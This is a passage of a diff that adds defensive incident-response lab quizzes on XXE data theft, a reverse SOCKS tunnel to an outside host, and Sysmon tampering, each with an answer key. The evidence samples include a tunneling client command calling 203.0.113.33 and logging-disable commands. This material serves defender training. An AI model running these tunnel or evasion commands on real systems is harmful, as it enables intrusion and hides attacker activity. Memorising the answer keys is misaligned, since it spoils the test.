+        walkthrough: 'When responses do not reflect data, attackers load an external DTD that builds a URL with file contents. Outbound filtering from app servers would have stopped this channel.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Contain',
+        evidence: 'Exposed per logs: /etc/app/config.properties, /etc/passwd, /home/app/.aws/credentials (attempted, 200)',
+        question: 'Which secrets need rotation first?',
+        options: [
+          'The database password and the AWS credentials, because they grant direct access to data and cloud resources',
+          '/etc/passwd hashes',
+          'The TLS certificate only',
+          'Nothing, the files were only read',
+        ],
+        correctIndex: 0,
+        hint: 'Which files contain usable secrets?',
+        walkthrough: 'Database and cloud credentials provide direct access. Rotate them and check DB and CloudTrail logs for use from unexpected sources. /etc/passwd normally contains no hashes on modern systems.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Fix the parser',
+        evidence: r`ClaimParser.java
+DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
+// proposed:
+f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+f.setExpandEntityReferences(false);`,
+        question: 'Why is disallowing DOCTYPE the recommended fix?',
+        options: [
+          'Without a DTD, no entities can be declared, which shuts off file reads, SSRF, and entity expansion attacks at once',
+          'It improves performance only',
+          'It enables HTTPS',
+          'It validates the schema',
+        ],
+        correctIndex: 0,
+        hint: 'Remove the feature that enables the attack.',
+        walkthrough: 'Most applications never need DTDs. Disabling them is the simplest complete defense. Also block egress from app servers and keep secrets out of readable files where possible.',
+      },
+    ],
+  },
+  {
+    id: 'lab-70',
+    title: 'Reverse Tunnel Through an HTTP Pivot Tool',
+    domain: 5,
+    difficulty: 'Hard',
+    xpReward: 250,
+    briefing: 'An attacker with access to a DMZ web server appears to be reaching internal RDP and SMB services, but the firewall blocks inbound connections to the internal network. Find the tunnel and shut it down.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Look at the process',
+        evidence: r`EDR: WEB-DMZ02
+Process: C:\ProgramData\svc\wupd.exe  args: client 203.0.113.33:443 R:socks
+Parent: w3wp.exe   Signed: no   Network: 1 persistent TLS connection to 203.0.113.33:443`,
+        question: 'What do the arguments suggest?',
+        options: [
+          'A tunneling client opened an outbound connection and offers the attacker a reverse SOCKS proxy into the network',
+          'A Windows update client',
+          'A web server worker',
+          'A DNS resolver',
+        ],
+        correctIndex: 0,
+        hint: 'R:socks means reverse SOCKS.',
+        walkthrough: 'Tools like chisel create an outbound tunnel, often over HTTP or TLS on port 443. The attacker\'s server then routes traffic back through the compromised host, bypassing inbound firewall rules.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Confirm internal reach',
+        evidence: r`Internal firewall log (source WEB-DMZ02 10.5.0.12)
+10:21:04  10.5.0.12 -> 10.20.1.10:3389  allow
+10:21:30  10.5.0.12 -> 10.20.1.11:445   allow
+10:22:12  10.5.0.12 -> 10.20.1.12:5985  deny`,
+        question: 'What does this show about the rules?',
+        options: [
+          'The DMZ host is allowed to reach internal RDP and SMB, which the tunnel is abusing',
+          'The DMZ is fully isolated',
+          'The attacker is scanning the internet',
+          'The internal servers attacked the DMZ',
+        ],
+        correctIndex: 0,
+        hint: 'Why would a web server need RDP to internal hosts?',
+        walkthrough: 'The tunnel can only reach what the DMZ host can reach. Overly broad DMZ-to-internal rules turn one web compromise into internal access.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Detect the tunnel in network data',
+        evidence: r`Zeek conn.log
+10.5.0.12 -> 203.0.113.33:443  duration 7h41m  orig_bytes 220 MB  resp_bytes 1.4 GB
+ssl.log: server_name (none)  ja3 = Go default client`,
+        question: 'Which features help identify tunnels?',
+        options: [
+          'DNS queries',
+          'Port 443 alone',
+          'Short sessions',
+          'A very long-lived TLS session with high bidirectional volume, no SNI, and a client fingerprint unusual for a web server',
+        ],
+        correctIndex: 3,
+        hint: 'Normal web servers rarely hold an outbound connection for hours.',
+        walkthrough: 'Long duration, large transfers both ways, missing SNI, and a Go client fingerprint point to a tunneling tool. Outbound connections from DMZ servers should be rare and allowlisted.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Contain',
+        evidence: r`Options
+A) Kill wupd.exe
+B) Block 203.0.113.33 at the egress firewall, isolate WEB-DMZ02, and check 10.20.1.10 and 10.20.1.11 for attacker sessions
+C) Change RDP port to 3390`,
+        question: 'Which option is best?',
+        options: [
+          'A only',
+          'B, cut the tunnel at the network and follow up on the internal hosts it touched',
+          'C',
+          'Wait to learn more',
+        ],
+        correctIndex: 1,
+        hint: 'Killing the process does not remove the foothold.',
+        walkthrough: 'The web shell that started the tunnel will relaunch it. Block egress, isolate the host, and investigate the internal targets for logons and dropped tools.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Harden the architecture',
+        evidence: r`Recommendations
+- Default-deny egress from DMZ; allow only required destinations
+- Remove DMZ-to-internal RDP/SMB; use a jump host with MFA
+- Alert when w3wp.exe spawns unsigned executables`,
+        question: 'Why is default-deny egress valuable here?',
+        options: [
+          'It speeds up the web server',
+          'Reverse tunnels need an outbound connection, so blocking unexpected egress breaks most tunneling tools',
+          'It blocks inbound attacks',
+          'It encrypts traffic',
+        ],
+        correctIndex: 1,
+        hint: 'Which direction did the tunnel use?',
+        walkthrough: 'Reverse tunnels start from inside. Egress filtering with an allowlist and a proxy forces tunnels to stand out or fail. It is one of the strongest controls for DMZ hosts.',
+      },
+    ],
+  },
+  {
+    id: 'lab-71',
+    title: 'Sysmon Tampering to Blind Defenders',
+    domain: 5,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'The SIEM shows a server that stopped sending Sysmon events three days ago, but Windows Security logs still arrive. The admin team did not make any changes. Investigate whether an attacker disabled monitoring.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Check the service',
+        evidence: r`sc query Sysmon64
+STATE: 4 RUNNING
+reg query HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters
+    Rules    REG_BINARY    (12 bytes)
+Previous known-good config: 41 KB`,
+        question: 'What does the tiny Rules value suggest?',
+        options: [
+          'Sysmon is working normally',
+          'The Sysmon configuration was replaced with an almost empty rule set, so the service runs but logs almost nothing',
+          'The service is stopped',
+          'The driver was uninstalled',
+        ],
+        correctIndex: 1,
+        hint: 'A running service with no rules is a quiet blind spot.',
+        walkthrough: 'Attackers can load a minimal config rather than stopping Sysmon, so health checks that only look at service state still pass. Comparing config size or hash catches it.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Find the change event',
+        evidence: r`Microsoft-Windows-Sysmon/Operational
+Event 16 (Sysmon config state changed)  2026-11-09 01:12:44
+Configuration: C:\Windows\Temp\c.xml   ConfigurationFileHash: SHA256=9F1...
+Security 4688  01:12:43  Sysmon64.exe -c C:\Windows\Temp\c.xml  User: CORP\svc_patch`,
+        question: 'What does Event 16 give you?',
+        options: [
+          'The network connections',
+          'A list of all processes',
+          'Nothing useful',
+          'The time of the config change, the file used, and with 4688 the account that ran it',
+        ],
+        correctIndex: 3,
+        hint: 'Sysmon logs changes to its own configuration.',
+        walkthrough: 'Event ID 16 records config changes. It is a high-value alert on its own. The matching process creation event shows svc_patch, which needs investigation.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Look for other tampering',
+        evidence: r`wevtutil gl Microsoft-Windows-PowerShell/Operational
+enabled: false
+auditpol /get /subcategory:"Process Creation"
+Process Creation  No Auditing   (Group Policy says Success)`,
+        question: 'What is the pattern here?',
+        options: [
+          'A failed patch',
+          'Normal Windows defaults',
+          'Several logging sources were disabled locally, showing a deliberate effort to reduce visibility',
+          'A disk space issue',
+        ],
+        correctIndex: 2,
+        hint: 'Look at what all three have in common.',
+        walkthrough: 'Disabling PowerShell logs and process auditing alongside Sysmon is defense evasion. The 4688 earlier came from before the audit change. Assume activity after that point is unlogged on the host.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Reconstruct the blind window',
+        evidence: r`Other sources for 11-09 01:12 to now
+- EDR telemetry (separate agent): available
+- Firewall and proxy logs: available
+- DC logs: 4624/4769 for this host: available`,
+        question: 'How should you investigate what happened during the gap?',
+        options: [
+          'Reimage first and investigate later',
+          'Assume nothing happened',
+          'Use sources the attacker did not control, such as EDR, network logs, and domain controller logs, to rebuild activity',
+          'Rely on the local Security log only',
+        ],
+        correctIndex: 2,
+        hint: 'What sources live off the host?',
+        walkthrough: 'Defenders should not rely on a single telemetry source. Off-host logs from DCs, network devices, and independent agents fill gaps left by local tampering.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Prevent and detect tampering',
+        evidence: r`Controls
+- SIEM alert on Sysmon Event 16 and on a host's event volume dropping by >90%
+- Restrict who can run Sysmon -c (local admin rights for svc_patch removed)
+- Deploy config via GPO/MDM and verify hash daily`,
+        question: 'Why alert on a drop in event volume?',
+        options: [
+          'Many tampering methods are silent, so a sudden drop in telemetry from a host is itself a signal',
+          'To save licensing costs',
+          'Because logs never vary',
+          'To detect disk failures only',
+        ],
+        correctIndex: 0,
+        hint: 'Absence can be a signal.',
+        walkthrough: 'Heartbeat and volume baselines catch blind spots from config changes, agent kills, or log channel disabling. Combined with config hash checks, tampering becomes visible quickly.',
+      },
+    ],
+  },
 ];
